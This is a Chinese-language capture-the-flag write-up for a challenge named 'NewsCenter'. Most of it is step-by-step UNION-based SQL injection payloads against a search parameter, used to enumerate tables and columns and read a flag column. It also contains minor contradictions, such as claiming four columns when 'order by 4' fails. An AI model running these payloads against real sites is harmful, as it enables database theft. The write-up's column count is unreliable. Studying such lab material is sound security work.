# NewsCenter

题目有一个 `search box`. 开始尝试没发现 `URL` 上有任何变化. 使用 `Burp Suite` 发现本题用 `POST` 方式传送变数 `search`.

直觉告诉我这题应该是 `SQL injection`. 尝试 `search=hello` 返回数据, 但 `search=hello'` 返回 `500 Internal Server Error`. 应该是符号 `'` 被过滤了. 尝试几次发现本题的 `comment` 符号是 `#`, 因为 `search=hello'#` 页面返回正常, 而 `search=hello'--` 和一些别的尝试都返回错误.

数据库有四个 `columns`:

```
search=hello'+order+by+1# 页面正常
search=hello'+order+by+2# 页面正常
search=hello'+order+by+3# 页面正常
search=hello'+order+by+4# 页面返回错误
```

尝试哪个 `columns` 可以显示数据:

```
search=hello'+union+select+1,2,3# 
```

发现 `columns 2 和 3` 可以显示数据.

读取 `table name`:

```
search=hello'+union+select+1,table_name,3+from+information_schema.tables#
```

页面返回很多数据库, 观察一下, 怀疑是 `secret_table`.

找 `secret_table` 的 `column_name`:

```
search=hello'+union+select+1,column_name,3+from+information_schema.columns+where+table_name='secret_table'#
```

果然有一个 `column` 是 `fl4g`. 最后就只是拿 `flag`:

```
search=hello'+union+select+1,fl4g,3+from+secret_table#
```
